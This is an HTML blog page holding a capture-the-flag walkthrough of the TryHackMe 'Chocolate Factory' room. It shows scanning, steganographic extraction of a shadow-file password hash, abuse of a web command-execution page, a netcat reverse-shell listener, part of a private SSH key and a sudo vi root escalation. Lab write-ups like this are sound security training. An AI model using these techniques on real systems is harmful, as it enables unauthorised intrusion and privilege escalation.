@@ -1,0 +1,664 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>[TryHackMe] Chocolate Factory - Walkthrough | ascrivins:blog</title>
+<meta name="keywords" content="Walkthrough, nmap, dirbuster, ssh, Privilege Escalation, Stenography" />
+<meta name="description" content="Beginner friendly room full of chocolate.">
+<meta name="author" content="ascrivins">
+<link rel="canonical" href="https://ascrivins.github.io/posts/tryhackme/charliechocolatefactory/" />
+<link crossorigin="anonymous" href="/assets/css/stylesheet.min.bc435bed1061be2618667408894ae8a5d27c970831ce57f287e42f911918fcbc.css" integrity="sha256-vENb7RBhviYYZnQIiUropdJ8lwgxzlfyh&#43;QvkRkY/Lw=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js" integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5&#43;kdJvBz5iKbt6B5PJI="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://ascrivins.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://ascrivins.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://ascrivins.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://ascrivins.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://ascrivins.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<meta name="generator" content="Hugo 0.82.1" />
+<meta property="og:title" content="[TryHackMe] Chocolate Factory - Walkthrough" />
+<meta property="og:description" content="Beginner friendly room full of chocolate." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://ascrivins.github.io/posts/tryhackme/charliechocolatefactory/" />
+<meta property="og:image" content="https://ascrivins.github.io/post_images/chocolate/banner.png" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-05-11T20:19:10&#43;01:00" />
+<meta property="article:modified_time" content="2021-05-11T20:19:10&#43;01:00" />
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://ascrivins.github.io/post_images/chocolate/banner.png" />
+<meta name="twitter:title" content="[TryHackMe] Chocolate Factory - Walkthrough"/>
+<meta name="twitter:description" content="Beginner friendly room full of chocolate."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://ascrivins.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "TryHackMe",
+      "item": "https://ascrivins.github.io/posts/tryhackme/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "[TryHackMe] Chocolate Factory - Walkthrough",
+      "item": "https://ascrivins.github.io/posts/tryhackme/charliechocolatefactory/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "[TryHackMe] Chocolate Factory - Walkthrough",
+  "name": "[TryHackMe] Chocolate Factory - Walkthrough",
+  "description": "Beginner friendly room full of chocolate.",
+  "keywords": [
+    "Walkthrough", "nmap", "dirbuster", "ssh", "Privilege Escalation", "Stenography"
+  ],
+  "articleBody": "Intro Link to room: https://tryhackme.com/room/chocolatefactory\n Reconnaissance nmap Scan The nmap scan takes a while to run. The reason why can be seen from the results, we are given a bulk of open ports but we are only interested in some of them.\n└─$ nmap -sC -sV 10.10.239.50 Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-11 19:10 BST Nmap scan report for 10.10.239.50 Host is up (0.088s latency). Not shown: 989 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 |_auth-owners: ERROR: Script execution failed (use -d to debug) | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_-rw-rw-r-- 1 1000 1000 208838 Sep 30 2020 gum_room.jpg | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.8.113.148 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 4 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) |_auth-owners: ERROR: Script execution failed (use -d to debug) | ssh-hostkey: | 2048 16:31:bb:b5:1f:cc:cc:12:14:8f:f0:d8:33:b0:08:9b (RSA) | 256 e7:1f:c9:db:3e:aa:44:b6:72:10:3c:ee:db:1d:33:90 (ECDSA) |_ 256 b4:45:02:b6:24:8e:a9:06:5f:6c:79:44:8a:06:55:5e (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_auth-owners: ERROR: Script execution failed (use -d to debug) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Site doesn't have a title (text/html). 100/tcp open newacct? |_auth-owners: ERROR: Script execution failed (use -d to debug) | fingerprint-strings: | GenericLines, NULL: | \"Welcome to chocolate room!! | ___.---------------. | .'__'__'__'__'__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\'__'__'__'__'_`.__| `. \\x20 ___ \\r | \\'__'__'__\\x20__'_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\"  So we are only interested in the FTP server, the SSH port and the HTTP server.\n FTP Server and Stenography The nmap scan told us the FTP server can be access with anonymous credentials and contains a file called gum_room.jpg. Let’s download that.\nConnected to 10.10.239.50. 220 (vsFTPd 3.0.3) Name (10.10.239.50:andy): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -rw-rw-r-- 1 1000 1000 208838 Sep 30 2020 gum_room.jpg 226 Directory send OK. ftp get gum_room.jpg local: gum_room.jpg remote: gum_room.jpg 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for gum_room.jpg (208838 bytes). 226 Transfer complete.  We can perform some Stenography on the downloaded photo to extract any info hidden in the metadata.\nFirstly with exiftool:\n└─$ exiftool gum_room.jpg ExifTool Version Number : 12.16 File Name : gum_room.jpg Directory : . File Size : 204 KiB File Modification Date/Time : 2021:05:11 19:17:38+01:00 File Access Date/Time : 2021:05:11 19:17:38+01:00 File Inode Change Date/Time : 2021:05:11 19:17:38+01:00 File Permissions : rw-r--r-- File Type : JPEG File Type Extension : jpg MIME Type : image/jpeg Exif Byte Order : Big-endian (Motorola, MM) Image Width : 1920 Image Height : 1080 Encoding Process : Baseline DCT, Huffman coding Bits Per Sample : 8 Color Components : 3 Y Cb Cr Sub Sampling : YCbCr4:2:0 (2 2) Image Size : 1920x1080 Megapixels : 2.1  Then using steghide with a blank passphrase:\n└─$ steghide extract -sf gum_room.jpg Enter passphrase: wrote extracted data to \"b64.txt\". └─$ cat b64.txt ZGFlbW9uOio6MTgzODA6MDo5OTk5OTo3Ojo6CmJpbjoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpzeXM6 KjoxODM4MDowOjk5OTk5Ojc6OjoKc3luYzoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpnYW1lczoqOjE4 MzgwOjA6OTk5OTk6Nzo6OgptYW46KjoxODM4MDowOjk5OTk5Ojc6OjoKbHA6KjoxODM4MDowOjk5 OTk5Ojc6OjoKbWFpbDoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpuZXdzOio6MTgzODA6MDo5OTk5OTo3 [Redacted]  Decoding the base64, we get a shadow file with a hashed password for Charlie:\n... i2psvc:*:18382:0:99999:7::: dradis:*:18382:0:99999:7::: beef-xss:*:18382:0:99999:7::: geoclue:*:18382:0:99999:7::: lightdm:*:18382:0:99999:7::: king-phisher:*:18382:0:99999:7::: systemd-coredump:!!:18396:::::: _rpc:*:18451:0:99999:7::: statd:*:18451:0:99999:7::: _gvm:*:18496:0:99999:7::: charlie:$6$CZJnCPeQ[Redacted]yIJWE82X/:18535:0:99999:7:::  Using john or hashcat, this password can be decrypted.\n Dirbuster The HTTP server landing page looks like this:\nRunning a dirbuster scan on this gives a /home.php page that bypasses the login validation.\n Exploitation Basic Commands The /home.php has an input that allows us to run commands directly on the host server.\nThe black font on the background makes the response difficult to see so I’ve written out the responses here:\nls home.jpg home.php image.png index.html index.php.bak key_rev_key validate.php  Reading out rev_key_rev, we find the key we’ve been looking for:\ncat key_rev_key ELF\u0002\u0001\u0001\u0003\u0001�\u0006@�\u0019@8 @\u001d\u001c\u0006\u0004@@@�\u0001�\u0001\u0008\u0003\u00048\u00028\u00028\u0002\u001c\u001c\u0001\u0001\u0005� � \u0001\u0006� � � x\u0002�\u0002 \u0002\u0006� � � �\u0001�\u0001\u0008\u0004\u0004T\u0002T\u0002T\u0002DD\u0004P�td\u0004� � �   Reverse Shell Using the python reserve shell found here: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp\n└─$ nc -lvnp 8080 listening on [any] 8080 ... connect to [10.8.113.148] from (UNKNOWN) [10.10.239.50] 39660 To run a command as administrator (user \"root\"), use \"sudo \". See \"man sudo_root\" for details. www-data@chocolate-factory:/var/www/html$ whoami whoami www-data   Find Key Navigating to Charlie’s home directory, there is a public/private key pair. We can make a copy of the private key on our machine and then login as charlie through ssh.\nwww-data@chocolate-factory:/home/charlie$ cat teleport cat teleport -----BEGIN RSA PRIVATE KEY----- MIIEowIBAAKCAQEA4adrPc3Uh98RYDrZ8CUBDgWLENUybF60lMk9YQOBDR+gpuRW 1AzL12K35/Mi3Vwtp0NSwmlS7ha4y9sv2kPXv8lFOmLi1FV2hqlQPLw/unnEFwUb L4KBqBemIDefV5pxMmCqqguJXIkzklAIXNYhfxLr8cBS/HJoh/7qmLqrDoXNhwYj B3zgov7RUtk15Jv11D0Itsyr54pvYhCQgdoorU7l42EZJayIomHKon1jkofd1/oY fOBwgz6JOlNH1jFJoyIZg2OmEhnSjUltZ9mSzmQyv3M4AORQo3ZeLb+zbnSJycEE  Once in as Charlie, we can read the contents of the user.txt flag:\ncharlie@chocolate-factory:/home/charlie$ ls -al total 40 drwxr-xr-x 5 charlie charley 4096 Oct 7 2020 . drwxr-xr-x 3 root root 4096 Oct 1 2020 .. -rw-r--r-- 1 charlie charley 3771 Apr 4 2018 .bashrc drwx------ 2 charlie charley 4096 Sep 1 2020 .cache drwx------ 3 charlie charley 4096 Sep 1 2020 .gnupg drwxrwxr-x 3 charlie charley 4096 Sep 29 2020 .local -rw-r--r-- 1 charlie charley 807 Apr 4 2018 .profile -rw-r--r-- 1 charlie charley 1675 Oct 6 2020 teleport -rw-r--r-- 1 charlie charley 407 Oct 6 2020 teleport.pub -rw-r----- 1 charlie charley 39 Oct 6 2020 user.txt charlie@chocolate-factory:/home/charlie$ cat user.txt flag{cd550[Redacted]b522d2e}   Privilege Escalation Sudo -l Running sudo -l tells us we can use vi with sudo privileges:\n charlie@chocolate-factory:/home/charlie$ sudo -l Matching Defaults entries for charlie on chocolate-factory: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User charlie may run the following commands on chocolate-factory: (ALL : !root) NOPASSWD: /usr/bin/vi  Checking GTFOBins, we get a command that will give is a reverse shell.\n Root Shell charlie@chocolate-factory:/$ sudo vi -c ‘:!/bin/sh’ /dev/null\n# whoami root # cd /root # ls -al total 52 drwx------ 6 root root 4096 May 11 18:39 . drwxr-xr-x 24 root root 4096 Sep 1 2020 .. -rw------- 1 root root 0 Oct 7 2020 .bash_history -rw-r--r-- 1 root root 3106 Apr 9 2018 .bashrc drwx------ 3 root root 4096 Oct 1 2020 .cache drwx------ 3 root root 4096 Sep 30 2020 .gnupg drwxr-xr-x 3 root root 4096 Sep 29 2020 .local -rw-r--r-- 1 root root 148 Aug 17 2015 .profile -rwxr-xr-x 1 charlie charley 491 Oct 1 2020 root.py -rw------- 1 root root 12288 May 11 18:39 .root.txt.swp -rw-r--r-- 1 root root 66 Sep 30 2020 .selected_editor drwx------ 2 root root 4096 Sep 1 2020 .ssh  Running that root.py, we need to supply the earlier key and then we are rewarded with the root flag.\n# python root.py Enter the key: b'-VkgX[Redacted]GSQzY=' __ __ _ _ _ _____ _ \\ \\ / /__ _ _ / \\ _ __ ___ | \\ | | _____ __ |_ _| |__ ___ \\ V / _ \\| | | | / _ \\ | '__/ _ \\ | \\| |/ _ \\ \\ /\\ / / | | | '_ \\ / _ \\ | | (_) | |_| | / ___ \\| | | __/ | |\\ | (_) \\ V V / | | | | | | __/ |_|\\___/ \\__,_| /_/ \\_\\_| \\___| |_| \\_|\\___/ \\_/\\_/ |_| |_| |_|\\___| ___ ___ __ / _ \\__ ___ __ ___ _ __ / _ \\ / _| | | | \\ \\ /\\ / / '_ \\ / _ \\ '__| | | | | |_ | |_| |\\ V V /| | | | __/ | | |_| | _| \\___/ \\_/\\_/ |_| |_|\\___|_| \\___/|_| ____ _ _ _ / ___| |__ ___ ___ ___ | | __ _| |_ ___ | | | '_ \\ / _ \\ / __/ _ \\| |/ _` | __/ _ \\ | |___| | | | (_) | (_| (_) | | (_| | || __/ \\____|_| |_|\\___/ \\___\\___/|_|\\__,_|\\__\\___| _____ _ | ___|_ _ ___| |_ ___ _ __ _ _ | |_ / _` |/ __| __/ _ \\| '__| | | | | _| (_| | (__| || (_) | | | |_| | |_| \\__,_|\\___|\\__\\___/|_| \\__, | |___/ flag{cec591[Redacted]96b42124}   ",
+  "wordCount" : "1468",
+  "inLanguage": "en",
+  "image":"https://ascrivins.github.io/post_images/chocolate/banner.png","datePublished": "2021-05-11T20:19:10+01:00",
+  "dateModified": "2021-05-11T20:19:10+01:00",
+  "author":{
+    "@type": "Person",
+    "name": "ascrivins"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://ascrivins.github.io/posts/tryhackme/charliechocolatefactory/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "ascrivins:blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://ascrivins.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+<noscript>
+    <style type="text/css">
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: #1d1e20;
+                --entry: #2e2e33;
+                --primary: rgba(255, 255, 255, 0.84);
+                --secondary: rgba(255, 255, 255, 0.56);
+                --tertiary: rgba(255, 255, 255, 0.16);
+                --content: rgba(255, 255, 255, 0.74);
+                --hljs-bg: #2e2e33;
+                --code-bg: #37383e;
+                --border: #333;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+
+<header class="header" style="border-bottom-style: solid; border-bottom-color: #56773d;">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://ascrivins.github.io/" accesskey="h" title="ascrivins:blog (Alt + H)">ascrivins:blog</a>
+            <span class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </span>
+        </div>
+        <ul id="menu" onscroll="menu_on_scroll()">
+            <li>
+                <a href="https://ascrivins.github.io/posts/" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://ascrivins.github.io/archives/" title="Archive">
+                    <span>Archive</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://ascrivins.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://ascrivins.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://ascrivins.github.io/posts/">Posts</a>&nbsp;»&nbsp;<a href="https://ascrivins.github.io/posts/tryhackme/">TryHackMe</a></div>
+    <h1 class="post-title">
+      [TryHackMe] Chocolate Factory - Walkthrough
+    </h1>
+    <div class="post-description">
+      Beginner friendly room full of chocolate.
+    </div>
+    <div class="post-meta">May 11, 2021&nbsp;·&nbsp;7 min&nbsp;·&nbsp;ascrivins
+</div>
+  </header> 
+<figure class="entry-cover"><img loading="lazy" src="https://ascrivins.github.io/post_images/chocolate/banner.png" alt="">
+        
+</figure><div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <div class="details">Table of Contents</div>
+        </summary>
+        <div class="inner"><ul>
+                <li>
+                    <a href="#intro" aria-label="Intro">Intro</a></li>
+                <li>
+                    <a href="#reconnaissance" aria-label="Reconnaissance">Reconnaissance</a><ul>
+                        
+                <li>
+                    <a href="#nmap-scan" aria-label="nmap Scan">nmap Scan</a></li>
+                <li>
+                    <a href="#ftp-server-and-stenography" aria-label="FTP Server and Stenography">FTP Server and Stenography</a></li>
+                <li>
+                    <a href="#dirbuster" aria-label="Dirbuster">Dirbuster</a></li></ul>
+                </li>
+                <li>
+                    <a href="#exploitation" aria-label="Exploitation">Exploitation</a><ul>
+                        
+                <li>
+                    <a href="#basic-commands" aria-label="Basic Commands">Basic Commands</a></li>
+                <li>
+                    <a href="#reverse-shell" aria-label="Reverse Shell">Reverse Shell</a></li>
+                <li>
+                    <a href="#find-key" aria-label="Find Key">Find Key</a></li></ul>
+                </li>
+                <li>
+                    <a href="#privilege-escalation" aria-label="Privilege Escalation">Privilege Escalation</a><ul>
+                        
+                <li>
+                    <a href="#sudo--l" aria-label="Sudo -l">Sudo -l</a></li>
+                <li>
+                    <a href="#root-shell" aria-label="Root Shell">Root Shell</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h1 id="intro">Intro<a hidden class="anchor" aria-hidden="true" href="#intro">#</a></h1>
+<p>Link to room: <a href="https://tryhackme.com/room/chocolatefactory">https://tryhackme.com/room/chocolatefactory</a></p>
+<hr>
+<h1 id="reconnaissance">Reconnaissance<a hidden class="anchor" aria-hidden="true" href="#reconnaissance">#</a></h1>
+<h2 id="nmap-scan">nmap Scan<a hidden class="anchor" aria-hidden="true" href="#nmap-scan">#</a></h2>
+<p>The nmap scan takes a while to run. The reason why can be seen from the results, we are given a bulk of open ports but we are only interested in some of them.</p>
+<pre><code>└─$ nmap -sC -sV 10.10.239.50 
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-11 19:10 BST
+Nmap scan report for 10.10.239.50
+Host is up (0.088s latency).
+Not shown: 989 closed ports
+PORT    STATE SERVICE    VERSION
+21/tcp  open  ftp        vsftpd 3.0.3
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-rw-r--    1 1000     1000       208838 Sep 30  2020 gum_room.jpg
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.8.113.148
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 4
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp  open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| ssh-hostkey: 
+|   2048 16:31:bb:b5:1f:cc:cc:12:14:8f:f0:d8:33:b0:08:9b (RSA)
+|   256 e7:1f:c9:db:3e:aa:44:b6:72:10:3c:ee:db:1d:33:90 (ECDSA)
+|_  256 b4:45:02:b6:24:8e:a9:06:5f:6c:79:44:8a:06:55:5e (ED25519)
+80/tcp  open  http       Apache httpd 2.4.29 ((Ubuntu))
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+100/tcp open  newacct?
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .'__'__'__'__'__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \'__'__'__'__'_`.__| `. \x20 ___ \r
+|     \'__'__'__\x20__'_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&quot;
+</code></pre>
+<p>So we are only interested in the FTP server, the SSH port and the HTTP server.</p>
+<hr>
+<h2 id="ftp-server-and-stenography">FTP Server and Stenography<a hidden class="anchor" aria-hidden="true" href="#ftp-server-and-stenography">#</a></h2>
+<p>The nmap scan told us the FTP server can be access with anonymous credentials and contains a file called gum_room.jpg. Let&rsquo;s download that.</p>
+<pre><code>Connected to 10.10.239.50.
+220 (vsFTPd 3.0.3)
+Name (10.10.239.50:andy): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-rw-r--    1 1000     1000       208838 Sep 30  2020 gum_room.jpg
+226 Directory send OK.
+ftp&gt; get gum_room.jpg
+local: gum_room.jpg remote: gum_room.jpg
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for gum_room.jpg (208838 bytes).
+226 Transfer complete.
+</code></pre>
+<p>We can perform some Stenography on the downloaded photo to extract any info hidden in the metadata.</p>
+<p>Firstly with exiftool:</p>
+<pre><code>└─$ exiftool gum_room.jpg 
+ExifTool Version Number         : 12.16
+File Name                       : gum_room.jpg
+Directory                       : .
+File Size                       : 204 KiB
+File Modification Date/Time     : 2021:05:11 19:17:38+01:00
+File Access Date/Time           : 2021:05:11 19:17:38+01:00
+File Inode Change Date/Time     : 2021:05:11 19:17:38+01:00
+File Permissions                : rw-r--r--
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+Exif Byte Order                 : Big-endian (Motorola, MM)
+Image Width                     : 1920
+Image Height                    : 1080
+Encoding Process                : Baseline DCT, Huffman coding
+Bits Per Sample                 : 8
+Color Components                : 3
+Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
+Image Size                      : 1920x1080
+Megapixels                      : 2.1
+</code></pre>
+<p>Then using steghide with a blank passphrase:</p>
+<pre><code>└─$ steghide extract -sf gum_room.jpg   
+Enter passphrase: 
+wrote extracted data to &quot;b64.txt&quot;.
+└─$ cat b64.txt 
+ZGFlbW9uOio6MTgzODA6MDo5OTk5OTo3Ojo6CmJpbjoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpzeXM6
+KjoxODM4MDowOjk5OTk5Ojc6OjoKc3luYzoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpnYW1lczoqOjE4
+MzgwOjA6OTk5OTk6Nzo6OgptYW46KjoxODM4MDowOjk5OTk5Ojc6OjoKbHA6KjoxODM4MDowOjk5
+OTk5Ojc6OjoKbWFpbDoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpuZXdzOio6MTgzODA6MDo5OTk5OTo3
+[Redacted]
+</code></pre>
+<p>Decoding the base64, we get a shadow file with a hashed password for Charlie:</p>
+<pre><code>...
+i2psvc:*:18382:0:99999:7:::
+dradis:*:18382:0:99999:7:::
+beef-xss:*:18382:0:99999:7:::
+geoclue:*:18382:0:99999:7:::
+lightdm:*:18382:0:99999:7:::
+king-phisher:*:18382:0:99999:7:::
+systemd-coredump:!!:18396::::::
+_rpc:*:18451:0:99999:7:::
+statd:*:18451:0:99999:7:::
+_gvm:*:18496:0:99999:7:::
+charlie:$6$CZJnCPeQ[Redacted]yIJWE82X/:18535:0:99999:7:::
+</code></pre>
+<p>Using john or hashcat, this password can be decrypted.</p>
+<hr>
+<h2 id="dirbuster">Dirbuster<a hidden class="anchor" aria-hidden="true" href="#dirbuster">#</a></h2>
+<p>The HTTP server landing page looks like this:</p>
+<p><img loading="lazy" src="/post_images/chocolate/home.png" alt="Main page"  />
+</p>
+<p>Running a dirbuster scan on this gives a /home.php page that bypasses the login validation.</p>
+<p><img loading="lazy" src="/post_images/chocolate/dirbuster.png" alt="dirbuster"  />
+</p>
+<hr>
+<h1 id="exploitation">Exploitation<a hidden class="anchor" aria-hidden="true" href="#exploitation">#</a></h1>
+<h2 id="basic-commands">Basic Commands<a hidden class="anchor" aria-hidden="true" href="#basic-commands">#</a></h2>
+<p>The /home.php has an input that allows us to run commands directly on the host server.</p>
+<p><img loading="lazy" src="/post_images/chocolate/command.png" alt="Command page"  />
+</p>
+<p>The black font on the background makes the response difficult to see so I&rsquo;ve written out the responses here:</p>
+<pre><code>ls
+home.jpg home.php image.png index.html index.php.bak key_rev_key validate.php
+</code></pre>
+<p>Reading out rev_key_rev, we find the key we&rsquo;ve been looking for:</p>
+<pre><code>cat key_rev_key
+ ELF&gt;�@�@8 @@@@��888� � � � � x� � � � ��TTTDDP�td� � � &lt;&lt;Q�tdR�td� � 
+ � hh/lib64/ld-linux-x86-64.so.2GNUGNU�s�ŗ5 tz�~������ 0MF� � 
+ 7&quot;libc.so.6__isoc99_scanfputs__stack_chk_failprintf__cxa_finalizestrcmp__l
+ ibc_start_mainGLIBC_2.7GLIBC_2.4GLIBC_2.2.5_ITM_deregisterTMCloneTable__gm
+ on_start___ITM_registerTMCloneTableii _ii iui s� �� `  � � � �  �  � 
+ � � � � H��H�� H��t��H����5j �%l @�%j h������%b h������%Z h������%R 
+ h�����%J h�����%b f�1�I��^H��H���PTL�*H� �H�=�� �DH�=9 UH�1 H9�H��t
+ H�� H��t ]��f.�]�@f.�H�=� H�5� UH)�H��H��H��H��?H�H��tH�� H��t]��f�]�@f.��=� u/H�=� UH��tH�=� � ����H����� ]����f
+ DUH��]�f���UH��H��@�}�H�u�dH�%(H�E�1�H�=)�����H�E�H��H�=#
+ �����H�E�H�5H���l�����u5H�= ��G���H�=(��6���H�=G��%����H�=D
+ ������H�U�dH3%(t�������f.�f�AWAVI��AUATL�% UH�- SA��I��L)�H��H��
+ �w���H��t 1��L��L��D��A��H��H9�u�H��[]A\A]A^A_Ðf.���H��H���Enter 
+ your name: %slaksdhfas congratulations you have found the key: b'-
+ VkgXh[Redacted]b8ABXeQuvhcGSQzY=' Keep its safeBad name!;8
+ �������������T���������L���,zRx�����+zRx�$���`FJw�?;*3$&quot;DH���\J����A
+ �C �D|����eB�B�E �B(�H0�H8�M@r8A0A(B BBB�����` �� � ���o��� �� x��� 
+ ���o���o����o���o����o� FVfv� GCC: (Ubuntu 7.5.0-3ubuntu1~18.04)...
+</code></pre>
+<hr>
+<h2 id="reverse-shell">Reverse Shell<a hidden class="anchor" aria-hidden="true" href="#reverse-shell">#</a></h2>
+<p>Using the python reserve shell found here: <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp</a></p>
+<pre><code>└─$ nc -lvnp 8080
+listening on [any] 8080 ...
+connect to [10.8.113.148] from (UNKNOWN) [10.10.239.50] 39660
+To run a command as administrator (user &quot;root&quot;), use &quot;sudo &lt;command&gt;&quot;.
+See &quot;man sudo_root&quot; for details.
+
+www-data@chocolate-factory:/var/www/html$ whoami
+whoami
+www-data
+</code></pre>
+<hr>
+<h2 id="find-key">Find Key<a hidden class="anchor" aria-hidden="true" href="#find-key">#</a></h2>
+<p>Navigating to Charlie&rsquo;s home directory, there is a public/private key pair. We can make a copy of the private key on our machine and then login as charlie through ssh.</p>
